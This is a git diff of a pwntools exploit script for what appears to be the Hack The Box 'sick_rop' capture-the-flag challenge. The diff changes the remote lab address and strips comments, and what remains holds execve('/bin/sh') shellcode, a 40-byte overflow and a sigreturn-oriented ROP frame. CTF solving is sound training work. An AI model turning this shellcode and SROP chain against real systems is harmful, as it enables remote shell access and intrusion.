@@ -10,17 +10,11 @@ context.terminal = ['tmux','splitw' ,'-h']
 
 #p = process("./sick_rop")
 #p = gdb.debug("./sick_rop", "break vuln")
-p = remote("206.189.125.216", 31912)
+p = remote("165.22.115.189", 31878)
 
 # 23 bytes
 shellcode = (b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05")
 
-# Find a function pointer's memory address by searching function's memory address as a value
-# within another memory address.
-# gef➤  grep 0x40102e <- vuln()
-# [+] Searching '\x2e\x10\x40' in memory
-# [+] In '/home/fresh/CTF/htb/sick_ROP/sick_rop'(0x401000-0x402000), permission=r-x
-#   0x4010d8 - 0x4010e4  →   "\x2e\x10\x40[...]" 
 vuln_pointer = 0x4010d8
 syscall = p64(0x401014)
 vuln  = p64(0x40102e)
@@ -36,13 +30,6 @@ frame.rdx = 7
 frame.rsp = vuln_pointer  # Notes below for vuln_pointer instead of vuln() address.
 frame.rip = syscall
 
-# Why not vuln function but a pointer to vuln?
-# Stack frames changed. Calling the vuln function directly will not get us to that function.
-
-# 1. Padding to Overflow
-# 2. ret2vuln() to adjust RAX to 0xf with 2nd payload
-# 3. 'syscall; ret' gadget to use sigreturn()
-# 4. bytes(frame) sets up the stack after sigreturn() is called and 
 #    return to vuln() for 3rd run for final payload(3).
 payload1 = b"A"*40 + vuln + p64(syscall) + bytes(frame)
 
